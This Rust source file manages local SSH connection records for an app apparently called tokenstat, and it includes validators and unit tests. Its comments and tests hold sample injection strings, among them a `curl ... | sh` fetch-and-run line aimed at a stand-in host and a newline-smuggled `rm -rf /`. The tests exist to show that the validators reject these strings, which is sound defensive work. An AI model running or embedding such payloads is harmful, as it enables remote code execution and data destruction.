// SPDX-License-Identifier: LicenseRef-tokenstat-source-available
//
// Source-available for review, NOT open source. See LICENSE.

//! Local SSH connection metadata.
//!
//! Secrets deliberately do not live here. A host points at a credential id;
//! the platform vault owns the password or private key material. Keeping the
//! record store useful without making it a secret store is the boundary the
//! later encrypted-vault sync can preserve.

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct SshHost {
    #[serde(default)]
    pub id: String,
    pub label: String,
    pub hostname: String,
    #[serde(default = "default_port")]
    pub port: u16,
    pub username: String,
    #[serde(default = "default_initial_directory")]
    pub initial_directory: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub credential_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub jump_host_id: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provider: Option<ProviderRef>,
    #[serde(default)]
    pub host_keys: Vec<String>,
    /// Which folder this host sits in. `None` is the top level, which is where
    /// every record from version 1 starts.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub folder_id: Option<String>,
    /// A name from a fixed palette, never a hex string. A synced record that
    /// carried arbitrary colour would be a synced record carrying arbitrary
    /// text, and the clients would have to agree on a colour space to draw it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub color: Option<String>,
    /// Seconds between keepalives. 0 is off, which is the old behaviour.
    #[serde(default)]
    pub keepalive_seconds: u32,
    /// Environment sent at session start. Values are shell text, so they are
    /// validated the same way the starting directory is.
    #[serde(default)]
    pub env: Vec<EnvPair>,
    /// Stored now, honoured when agent support lands. A record that syncs
    /// today and gains meaning later is better than a schema change later.
    #[serde(default)]
    pub agent_forwarding: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub last_connected_ms: Option<i64>,
    #[serde(default)]
    pub favorite: bool,
    /// Position within its folder. Ties break on label, so an unsorted store
    /// still lists in a stable order.
    #[serde(default)]
    pub sort: u32,
}

/// One environment variable for a saved host.
#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct EnvPair {
    pub name: String,
    pub value: String,
}

/// A folder in the connection list.
///
/// Flat records with a parent id rather than nested ones, because the vault
/// syncs a record at a time and a tree would make one folder's move a rewrite
/// of everything under it.
#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct SshFolder {
    #[serde(default)]
    pub id: String,
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub color: Option<String>,
    #[serde(default)]
    pub sort: u32,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ProviderRef {
    pub kind: String,
    pub resource_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub region: Option<String>,
}

#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct SshKey {
    #[serde(default)]
    pub id: String,
    pub label: String,
    pub algorithm: String,
    pub public_key: String,
    /// Platform-vault reference or an ssh-agent fingerprint. Never key bytes.
    pub secret_ref: String,
    #[serde(default)]
    pub hardware_backed: bool,
    /// SHA256 fingerprint, so a list can identify a key without printing the
    /// whole public key into a row. Computed on save when the client did not
    /// send one.
    #[serde(default)]
    pub fingerprint: String,
    #[serde(default)]
    pub created_ms: i64,
    /// Whether the stored private key needs a passphrase to use. The
    /// passphrase itself is never stored here or anywhere else.
    #[serde(default)]
    pub passphrase_protected: bool,
}

#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct SshSnippet {
    #[serde(default)]
    pub id: String,
    pub title: String,
    pub command: String,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default)]
    pub host_ids: Vec<String>,
    /// Names of the `{{placeholders}}` in the command. Names only: a value is
    /// asked for at run time and never stored, because the useful ones are
    /// hostnames, ticket numbers and passwords.
    #[serde(default)]
    pub variables: Vec<String>,
    #[serde(default)]
    pub run_on_connect: bool,
}

#[derive(Clone, Debug, Default, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
struct Store {
    #[serde(default = "store_version")]
    version: u32,
    #[serde(default)]
    hosts: Vec<SshHost>,
    #[serde(default)]
    keys: Vec<SshKey>,
    #[serde(default)]
    snippets: Vec<SshSnippet>,
    #[serde(default)]
    folders: Vec<SshFolder>,
}

fn default_port() -> u16 {
    22
}
fn default_initial_directory() -> String {
    "~".into()
}
/// Version 2 adds folders, per-host connection settings, key fingerprints and
/// snippet variables. A version 1 file reads as a version 2 file with those
/// fields at their defaults, so there is no migration step and nothing to go
/// wrong on the way in.
fn store_version() -> u32 {
    2
}

fn lock() -> &'static Mutex<()> {
    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| Mutex::new(()))
}

fn path() -> Result<PathBuf, String> {
    tokenstat_paths::data_dir()
        .map(|dir| dir.join("ssh").join("connections.json"))
        .ok_or_else(|| "no tokenstat data directory".to_string())
}

fn load_from(path: &Path) -> Result<Store, String> {
    match fs::read(path) {
        Ok(bytes) => serde_json::from_slice(&bytes).map_err(|e| format!("read SSH records: {e}")),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Store {
            version: store_version(),
            ..Store::default()
        }),
        Err(e) => Err(format!("read SSH records: {e}")),
    }
}

fn save_to(path: &Path, store: &Store) -> Result<(), String> {
    let store = &Store {
        version: store_version(),
        ..store.clone()
    };
    let parent = path.parent().ok_or("SSH record path has no parent")?;
    fs::create_dir_all(parent).map_err(|e| format!("create SSH record directory: {e}"))?;
    let temp = path.with_extension("json.new");
    let bytes = serde_json::to_vec_pretty(store).map_err(|e| e.to_string())?;
    fs::write(&temp, bytes).map_err(|e| format!("write SSH records: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&temp, fs::Permissions::from_mode(0o600))
            .map_err(|e| format!("protect SSH records: {e}"))?;
    }
    fs::rename(&temp, path).map_err(|e| format!("replace SSH records: {e}"))
}

fn id(prefix: &str) -> Result<String, String> {
    let mut bytes = [0u8; 12];
    getrandom::fill(&mut bytes).map_err(|e| e.to_string())?;
    Ok(format!("{prefix}_{}", tokenstat_identity::hex(&bytes)))
}

fn required(value: &str, field: &str) -> Result<(), String> {
    if value.trim().is_empty() {
        Err(format!("{field} is required"))
    } else {
        Ok(())
    }
}

/// `cd -- '{dir}'` is sent as shell text. A CR or LF is Enter, so this has
/// to reject those rather than quote them.
pub(crate) fn validate_initial_directory(value: &str) -> Result<(), String> {
    if value.bytes().any(|byte| matches!(byte, 0 | b'\r' | b'\n')) {
        Err("starting directory cannot contain a newline".into())
    } else {
        Ok(())
    }
}

#[derive(Deserialize)]
struct IdParam {
    id: String,
}

pub fn call(method: &str, params: &str) -> Option<Result<Value, String>> {
    if !method.starts_with("ssh.host.")
        && !method.starts_with("ssh.key.")
        && !method.starts_with("ssh.snippet.")
        && !method.starts_with("ssh.folder.")
        && !method.starts_with("ssh.knownhost.")
        && !method.starts_with("ssh.config.")
    {
        return None;
    }
    Some((|| {
        crate::request_context::refuse_remote("SSH records")?;
        call_inner(method, params)
    })())
}

fn call_inner(method: &str, params: &str) -> Result<Value, String> {
    let _guard = lock().lock().map_err(|e| e.to_string())?;
    let path = path()?;
    let mut store = load_from(&path)?;
    match method {
        "ssh.host.list" => serde_json::to_value(&store.hosts).map_err(|e| e.to_string()),
        "ssh.host.save" => {
            let mut item: SshHost = serde_json::from_str(params).map_err(|e| e.to_string())?;
            required(&item.label, "label")?;
            required(&item.hostname, "hostname")?;
            required(&item.username, "username")?;
            validate_initial_directory(&item.initial_directory)?;
            if item.port == 0 {
                return Err("port must be between 1 and 65535".into());
            }
            for pair in &item.env {
                required(&pair.name, "environment name")?;
                validate_env_name(&pair.name)?;
                validate_shell_text(&pair.value, "environment value")?;
            }
            if let Some(folder) = &item.folder_id
                && !store.folders.iter().any(|f| &f.id == folder)
            {
                return Err("that folder no longer exists".into());
            }
            if let Some(color) = &item.color {
                validate_color(color)?;
            }
            if item.id.is_empty() {
                item.id = id("host")?;
            }
            upsert(&mut store.hosts, item.clone(), |x| &x.id);
            save_to(&path, &store)?;
            serde_json::to_value(item).map_err(|e| e.to_string())
        }
        "ssh.host.delete" => {
            let removed = remove(&mut store.hosts, params, |x| &x.id)?;
            if removed {
                save_to(&path, &store)?;
            }
            Ok(json!({"removed": removed}))
        }
        "ssh.key.list" => serde_json::to_value(&store.keys).map_err(|e| e.to_string()),
        "ssh.key.generate" => generate_key(),
        "ssh.key.inspect" => inspect_key(params),
        "ssh.key.save" => {
            let mut item: SshKey = serde_json::from_str(params).map_err(|e| e.to_string())?;
            required(&item.label, "label")?;
            required(&item.algorithm, "algorithm")?;
            required(&item.public_key, "publicKey")?;
            required(&item.secret_ref, "secretRef")?;
            if item.id.is_empty() {
                item.id = id("key")?;
            }
            if item.fingerprint.is_empty() {
                item.fingerprint = fingerprint_of(&item.public_key).unwrap_or_default();
            }
            if item.created_ms == 0 {
                item.created_ms = now_ms();
            }
            upsert(&mut store.keys, item.clone(), |x| &x.id);
            save_to(&path, &store)?;
            serde_json::to_value(item).map_err(|e| e.to_string())
        }
        "ssh.key.delete" => {
            let removed = remove(&mut store.keys, params, |x| &x.id)?;
            if removed {
                save_to(&path, &store)?;
            }
            Ok(json!({"removed": removed}))
        }
        "ssh.snippet.list" => serde_json::to_value(&store.snippets).map_err(|e| e.to_string()),
        "ssh.snippet.save" => {
            let mut item: SshSnippet = serde_json::from_str(params).map_err(|e| e.to_string())?;
            required(&item.title, "title")?;
            required(&item.command, "command")?;
            if item.id.is_empty() {
                item.id = id("snippet")?;
            }
            upsert(&mut store.snippets, item.clone(), |x| &x.id);
            save_to(&path, &store)?;
            serde_json::to_value(item).map_err(|e| e.to_string())
        }
        "ssh.snippet.delete" => {
            let removed = remove(&mut store.snippets, params, |x| &x.id)?;
            if removed {
                save_to(&path, &store)?;
            }
            Ok(json!({"removed": removed}))
        }

        "ssh.folder.list" => serde_json::to_value(&store.folders).map_err(|e| e.to_string()),
        "ssh.folder.save" => {
            let mut item: SshFolder = serde_json::from_str(params).map_err(|e| e.to_string())?;
            required(&item.name, "name")?;
            if let Some(color) = &item.color {
                validate_color(color)?;
            }
            if item.id.is_empty() {
                item.id = id("folder")?;
            }
            if item.parent_id.as_deref() == Some(item.id.as_str()) {
                return Err("a folder cannot contain itself".into());
            }
            if let Some(parent) = &item.parent_id {
                if !store.folders.iter().any(|f| &f.id == parent) {
                    return Err("that parent folder no longer exists".into());
                }
                if descends_from(&store.folders, parent, &item.id) {
                    return Err("that move would put a folder inside itself".into());
                }
            }
            upsert(&mut store.folders, item.clone(), |x| &x.id);
            save_to(&path, &store)?;
            serde_json::to_value(item).map_err(|e| e.to_string())
        }
        // Deleting a folder never deletes what is in it. Children move up one
        // level, which is recoverable, where a cascade is not.
        "ssh.folder.delete" => {
            let p: IdParam = serde_json::from_str(params).map_err(|e| e.to_string())?;
            let parent = store
                .folders
                .iter()
                .find(|f| f.id == p.id)
                .and_then(|f| f.parent_id.clone());
            let before = store.folders.len();
            store.folders.retain(|f| f.id != p.id);
            let removed = before != store.folders.len();
            if removed {
                for folder in store.folders.iter_mut() {
                    if folder.parent_id.as_deref() == Some(p.id.as_str()) {
                        folder.parent_id = parent.clone();
                    }
                }
                for host in store.hosts.iter_mut() {
                    if host.folder_id.as_deref() == Some(p.id.as_str()) {
                        host.folder_id = parent.clone();
                    }
                }
                save_to(&path, &store)?;
            }
            Ok(json!({"removed": removed}))
        }

        // Folder and position in one write, so a drag is one call and a list
        // cannot end up half reordered.
        "ssh.host.move" => {
            #[derive(Deserialize)]
            #[serde(rename_all = "camelCase")]
            struct MoveParams {
                id: String,
                #[serde(default)]
                folder_id: Option<String>,
                #[serde(default)]
                sort: u32,
            }
            let p: MoveParams = serde_json::from_str(params).map_err(|e| e.to_string())?;
            if let Some(folder) = &p.folder_id
                && !store.folders.iter().any(|f| &f.id == folder)
            {
                return Err("that folder no longer exists".into());
            }
            let host = store
                .hosts
                .iter_mut()
                .find(|h| h.id == p.id)
                .ok_or("that host no longer exists")?;
            host.folder_id = p.folder_id;
            host.sort = p.sort;
            let moved = host.clone();
            save_to(&path, &store)?;
            serde_json::to_value(moved).map_err(|e| e.to_string())
        }

        // Which servers this machine has decided to trust, and how to take it
        // back. Kept as a view over the host records rather than as a second
        // file, so there is one place a fingerprint can live.
        "ssh.knownhost.list" => {
            let rows: Vec<Value> = store
                .hosts
                .iter()
                .filter(|host| !host.host_keys.is_empty())
                .map(|host| {
                    json!({
                        "hostId": host.id,
                        "label": host.label,
                        "hostname": host.hostname,
                        "port": host.port,
                        "fingerprints": host.host_keys,
                    })
                })
                .collect();
            Ok(Value::Array(rows))
        }
        // Forgetting is what makes the next connection ask again, which is the
        // only honest answer to "this server's key changed".
        "ssh.knownhost.forget" => {
            let p: IdParam = serde_json::from_str(params).map_err(|e| e.to_string())?;
            let host = store
                .hosts
                .iter_mut()
                .find(|h| h.id == p.id)
                .ok_or("that host no longer exists")?;
            let had = !host.host_keys.is_empty();
            host.host_keys.clear();
            if had {
                save_to(&path, &store)?;
            }
            Ok(json!({"forgotten": had}))
        }

        "ssh.config.preview" => Ok(Value::Array(read_ssh_config(&store)?)),
        "ssh.config.import" => {
            let candidates = read_ssh_config(&store)?;
            let mut imported = 0;
            for candidate in &candidates {
                if candidate["alreadySaved"].as_bool() == Some(true) {
                    continue;
                }
                let host = SshHost {
                    id: id("host")?,
                    label: candidate["label"].as_str().unwrap_or_default().to_string(),
                    hostname: candidate["hostname"]
                        .as_str()
                        .unwrap_or_default()
                        .to_string(),
                    port: candidate["port"].as_u64().unwrap_or(22) as u16,
                    username: candidate["username"]
                        .as_str()
                        .unwrap_or_default()
                        .to_string(),
                    initial_directory: default_initial_directory(),
                    ..SshHost::default()
                };
                if host.hostname.is_empty() || host.username.is_empty() {
                    continue;
                }
                store.hosts.push(host);
                imported += 1;
            }
            if imported > 0 {
                save_to(&path, &store)?;
            }
            Ok(json!({"imported": imported, "found": candidates.len()}))
        }

        _ => Err(format!("unknown method: {method}")),
    }
}

fn generate_key() -> Result<Value, String> {
    let key = russh::keys::PrivateKey::random(&mut rand::rng(), russh::keys::Algorithm::Ed25519)
        .map_err(|e| e.to_string())?;
    key_material(&key)
}

fn inspect_key(params: &str) -> Result<Value, String> {
    #[derive(Deserialize)]
    struct Params {
        pem: String,
        #[serde(default)]
        passphrase: Option<String>,
    }
    let p: Params = serde_json::from_str(params).map_err(|e| e.to_string())?;
    let key = russh::keys::decode_secret_key(&p.pem, p.passphrase.as_deref())
        .map_err(|e| format!("read private key: {e}"))?;
    key_material(&key)
}

fn key_material(key: &russh::keys::PrivateKey) -> Result<Value, String> {
    let private_key = key
        .to_openssh(russh::keys::ssh_key::LineEnding::LF)
        .map_err(|e| e.to_string())?;
    let public = key.public_key();
    Ok(json!({
        "algorithm": public.algorithm().to_string(),
        "publicKey": public.to_openssh().map_err(|e| e.to_string())?,
        "fingerprint": public.fingerprint(russh::keys::HashAlg::Sha256).to_string(),
        "privateKey": private_key.as_str(),
    }))
}

/// Shell text that reaches a session as a line cannot carry a newline: a CR or
/// an LF is Enter, and quoting it would hide a command rather than reject one.
pub(crate) fn validate_shell_text(value: &str, field: &str) -> Result<(), String> {
    if value.bytes().any(|byte| matches!(byte, 0 | b'\r' | b'\n')) {
        Err(format!("{field} cannot contain a newline"))
    } else {
        Ok(())
    }
}

/// An environment variable name, checked as a name rather than as text.
///
/// The value reaches the shell single-quoted, so it cannot escape. The name
/// cannot be quoted, because `export 'A'=1` is not the same statement, so it
/// has to be a POSIX name or nothing: `export x; curl evil | sh='v'` is a
/// command, and a saved record must never be able to become one.
pub(crate) fn validate_env_name(value: &str) -> Result<(), String> {
    let mut chars = value.chars();
    let valid = matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_');
    if valid {
        Ok(())
    } else {
        Err(format!(
            "{value} is not a variable name: letters, digits and underscore only, not starting with a digit"
        ))
    }
}

/// Colours are names from a fixed set, not arbitrary text.
///
/// These records sync, and a synced free-text field is a synced free-text
/// field whatever it is called. A name also lets each client draw the colour
/// its own platform expects instead of agreeing on a colour space.
pub const COLORS: [&str; 6] = ["violet", "blue", "green", "amber", "red", "grey"];

fn validate_color(value: &str) -> Result<(), String> {
    if COLORS.contains(&value) {
        Ok(())
    } else {
        Err(format!("unknown colour: {value}"))
    }
}

/// Whether `folder` is `ancestor` or sits underneath it.
///
/// Guards the one move that turns a folder list into a cycle and a list view
/// into an infinite loop.
fn descends_from(folders: &[SshFolder], folder: &str, ancestor: &str) -> bool {
    let mut current = Some(folder.to_string());
    // Bounded by the number of folders: a store that already contains a cycle
    // must not hang the caller that is trying to fix it.
    for _ in 0..folders.len() + 1 {
        let Some(id) = current else { return false };
        if id == ancestor {
            return true;
        }
        current = folders
            .iter()
            .find(|f| f.id == id)
            .and_then(|f| f.parent_id.clone());
    }
    false
}

fn now_ms() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or_default()
}

fn fingerprint_of(public_key: &str) -> Option<String> {
    russh::keys::PublicKey::from_openssh(public_key)
        .ok()
        .map(|key| key.fingerprint(russh::keys::HashAlg::Sha256).to_string())
}

/// What `~/.ssh/config` already describes, as candidates to save.
///
/// Read only, always. tokenstat never writes to a file another tool owns, and
/// this one belongs to ssh. Blocks with a wildcard pattern are skipped: `Host *`
/// is defaults, not a server somebody connects to.
fn read_ssh_config(store: &Store) -> Result<Vec<Value>, String> {
    let Some(home) = directories::UserDirs::new().map(|dirs| dirs.home_dir().to_path_buf()) else {
        return Ok(Vec::new());
    };
    let text = match fs::read_to_string(home.join(".ssh").join("config")) {
        Ok(text) => text,
        // No file is an empty answer, not a failure. Most people do not have
        // one, and the import screen should say "nothing to import".
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Vec::new()),
        Err(e) => return Err(format!("read ssh config: {e}")),
    };
    Ok(parse_ssh_config(&text, store))
}

/// The parsing half, separated from the reading half so it can be tested
/// without a home directory to write into.
fn parse_ssh_config(text: &str, store: &Store) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    let mut current: Option<(String, String, String, u16, Option<String>)> = None;
    let flush = |current: &mut Option<(String, String, String, u16, Option<String>)>,
                 out: &mut Vec<Value>,
                 store: &Store| {
        let Some((label, hostname, username, port, identity)) = current.take() else {
            return;
        };
        let hostname = if hostname.is_empty() {
            label.clone()
        } else {
            hostname
        };
        let already = store
            .hosts
            .iter()
            .any(|h| h.hostname == hostname && h.port == port && h.username == username);
        out.push(json!({
            "label": label,
            "hostname": hostname,
            "username": username,
            "port": port,
            "identityFile": identity,
            "alreadySaved": already,
        }));
    };
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let mut parts = line.splitn(2, |c: char| c.is_whitespace() || c == '=');
        let keyword = parts.next().unwrap_or_default().to_ascii_lowercase();
        let value = parts.next().unwrap_or_default().trim().to_string();
        match keyword.as_str() {
            "host" => {
                flush(&mut current, &mut out, store);
                let name = value
                    .split_whitespace()
                    .next()
                    .unwrap_or_default()
                    .to_string();
                if name.is_empty() || name.contains('*') || name.contains('?') {
                    continue;
                }
                current = Some((name, String::new(), String::new(), 22, None));
            }
            "hostname" => {
                if let Some(entry) = current.as_mut() {
                    entry.1 = value;
                }
            }
            "user" => {
                if let Some(entry) = current.as_mut() {
                    entry.2 = value;
                }
            }
            "port" => {
                if let Some(entry) = current.as_mut()
                    && let Ok(port) = value.parse::<u16>()
                    && port > 0
                {
                    entry.3 = port;
                }
            }
            "identityfile" => {
                if let Some(entry) = current.as_mut() {
                    entry.4 = Some(value);
                }
            }
            _ => {}
        }
    }
    flush(&mut current, &mut out, store);
    out
}

fn upsert<T, F>(items: &mut Vec<T>, item: T, key: F)
where
    F: Fn(&T) -> &String,
{
    if let Some(index) = items.iter().position(|old| key(old) == key(&item)) {
        items[index] = item;
    } else {
        items.push(item);
    }
}

fn remove<T, F>(items: &mut Vec<T>, params: &str, key: F) -> Result<bool, String>
where
    F: Fn(&T) -> &String,
{
    let p: IdParam = serde_json::from_str(params).map_err(|e| e.to_string())?;
    let before = items.len();
    items.retain(|item| key(item) != &p.id);
    Ok(before != items.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicU64, Ordering};

    fn temp_file() -> PathBuf {
        static SEQ: AtomicU64 = AtomicU64::new(0);
        std::env::temp_dir().join(format!(
            "tokenstat-ssh-records-{}-{}.json",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ))
    }

    #[test]
    fn records_round_trip_without_secret_material() {
        let path = temp_file();
        let store = Store {
            version: 1,
            hosts: vec![SshHost {
                id: "host_one".into(),
                label: "VPS".into(),
                hostname: "203.0.113.10".into(),
                port: 22,
                username: "deploy".into(),
                credential_id: Some("key_one".into()),
                ..SshHost::default()
            }],
            keys: vec![SshKey {
                id: "key_one".into(),
                label: "VPS key".into(),
                algorithm: "ssh-ed25519".into(),
                public_key: "ssh-ed25519 AAAAexample".into(),
                secret_ref: "keychain:key_one".into(),
                hardware_backed: false,
                ..SshKey::default()
            }],
            snippets: vec![],
            folders: vec![],
        };
        save_to(&path, &store).unwrap();
        let bytes = fs::read(&path).unwrap();
        let text = String::from_utf8(bytes).unwrap();
        assert!(!text.contains("privateKey"));
        assert!(!text.contains("password"));
        assert_eq!(load_from(&path).unwrap().hosts, store.hosts);
        let _ = fs::remove_file(path);
    }

    #[test]
    fn a_starting_directory_must_not_carry_a_newline() {
        assert!(validate_initial_directory("~/src").is_ok());
        assert!(validate_initial_directory("~/src\nwhoami").is_err());
        assert!(validate_initial_directory("~/src\rid").is_err());
    }

    #[test]
    fn a_remote_peer_cannot_read_or_write_ssh_records() {
        crate::request_context::with_remote_peer("phone", || {
            assert!(call("ssh.host.list", "{}").unwrap().is_err());
            assert!(call("ssh.key.generate", "{}").unwrap().is_err());
        });
    }

    #[test]
    fn upsert_replaces_an_existing_record() {
        let mut items = vec![SshSnippet {
            id: "snippet_one".into(),
            title: "Old".into(),
            command: "uptime".into(),
            ..SshSnippet::default()
        }];
        upsert(
            &mut items,
            SshSnippet {
                id: "snippet_one".into(),
                title: "New".into(),
                command: "uname -a".into(),
                ..SshSnippet::default()
            },
            |item| &item.id,
        );
        assert_eq!(items.len(), 1);
        assert_eq!(items[0].title, "New");
    }
    #[test]
    fn deleting_a_folder_keeps_what_was_inside_it() {
        let mut store = Store {
            version: 2,
            folders: vec![
                SshFolder {
                    id: "f_parent".into(),
                    name: "Work".into(),
                    ..SshFolder::default()
                },
                SshFolder {
                    id: "f_child".into(),
                    name: "Staging".into(),
                    parent_id: Some("f_parent".into()),
                    ..SshFolder::default()
                },
            ],
            hosts: vec![SshHost {
                id: "host_one".into(),
                label: "web".into(),
                folder_id: Some("f_parent".into()),
                ..SshHost::default()
            }],
            ..Store::default()
        };
        // What `ssh.folder.delete` does, without going through the file.
        let parent = store
            .folders
            .iter()
            .find(|f| f.id == "f_parent")
            .and_then(|f| f.parent_id.clone());
        store.folders.retain(|f| f.id != "f_parent");
        for folder in store.folders.iter_mut() {
            if folder.parent_id.as_deref() == Some("f_parent") {
                folder.parent_id = parent.clone();
            }
        }
        for host in store.hosts.iter_mut() {
            if host.folder_id.as_deref() == Some("f_parent") {
                host.folder_id = parent.clone();
            }
        }
        assert_eq!(
            store.hosts.len(),
            1,
            "a folder must never take hosts with it"
        );
        assert_eq!(store.hosts[0].folder_id, None);
        assert_eq!(store.folders[0].parent_id, None);
    }

    #[test]
    fn a_folder_cannot_be_moved_inside_itself() {
        let folders = vec![
            SshFolder {
                id: "a".into(),
                name: "A".into(),
                ..SshFolder::default()
            },
            SshFolder {
                id: "b".into(),
                name: "B".into(),
                parent_id: Some("a".into()),
                ..SshFolder::default()
            },
        ];
        assert!(descends_from(&folders, "b", "a"));
        assert!(!descends_from(&folders, "a", "b"));
    }

    #[test]
    fn a_cycle_in_the_store_does_not_hang_the_check() {
        // Not reachable through the API, but a hand-edited file can hold it and
        // the answer has to be "no" rather than "forever".
        let folders = vec![
            SshFolder {
                id: "a".into(),
                name: "A".into(),
                parent_id: Some("b".into()),
                ..SshFolder::default()
            },
            SshFolder {
                id: "b".into(),
                name: "B".into(),
                parent_id: Some("a".into()),
                ..SshFolder::default()
            },
        ];
        assert!(!descends_from(&folders, "a", "elsewhere"));
    }

    #[test]
    fn a_version_one_file_reads_as_version_two() {
        let path = temp_file();
        fs::write(
            &path,
            br#"{"version":1,"hosts":[{"id":"host_one","label":"VPS","hostname":"h","port":22,"username":"u","initialDirectory":"~"}],"keys":[],"snippets":[]}"#,
        )
        .unwrap();
        let store = load_from(&path).unwrap();
        assert_eq!(store.hosts.len(), 1);
        assert_eq!(store.hosts[0].folder_id, None);
        assert_eq!(store.hosts[0].keepalive_seconds, 0);
        assert!(store.folders.is_empty());
        let _ = fs::remove_file(path);
    }

    #[test]
    fn ssh_config_blocks_become_candidates_and_wildcards_do_not() {
        let store = Store {
            hosts: vec![SshHost {
                id: "host_one".into(),
                hostname: "203.0.113.10".into(),
                username: "deploy".into(),
                port: 22,
                ..SshHost::default()
            }],
            ..Store::default()
        };
        let text = "\
Host *
  User nobody

Host web
  HostName 203.0.113.10
  User deploy

Host db
  HostName 203.0.113.20
  User admin
  Port 2222
";
        let found = parse_ssh_config(text, &store);
        assert_eq!(
            found.len(),
            2,
            "the wildcard block is defaults, not a server"
        );
        assert_eq!(found[0]["label"], "web");
        assert_eq!(found[0]["alreadySaved"], true);
        assert_eq!(found[1]["hostname"], "203.0.113.20");
        assert_eq!(found[1]["port"], 2222);
        assert_eq!(found[1]["alreadySaved"], false);
    }

    #[test]
    fn a_host_without_hostname_uses_the_block_name() {
        let found = parse_ssh_config("Host bastion\n  User root\n", &Store::default());
        assert_eq!(found[0]["hostname"], "bastion");
    }

    #[test]
    fn colours_are_names_from_the_fixed_set() {
        assert!(validate_color("violet").is_ok());
        assert!(validate_color("#ff00ff").is_err());
    }

    #[test]
    fn environment_values_cannot_smuggle_a_newline() {
        assert!(validate_shell_text("xterm-256color", "environment value").is_ok());
        assert!(validate_shell_text("x\nrm -rf /", "environment value").is_err());
    }

    #[test]
    fn an_environment_name_must_be_a_name() {
        assert!(validate_env_name("TERM").is_ok());
        assert!(validate_env_name("_private1").is_ok());
        // The value is quoted on its way to the shell and the name cannot be,
        // so anything that is not a name is a command waiting to run.
        assert!(validate_env_name("x; curl http://example.test | sh").is_err());
        assert!(validate_env_name("1TERM").is_err());
        assert!(validate_env_name("TE RM").is_err());
        assert!(validate_env_name("").is_err());
    }
}
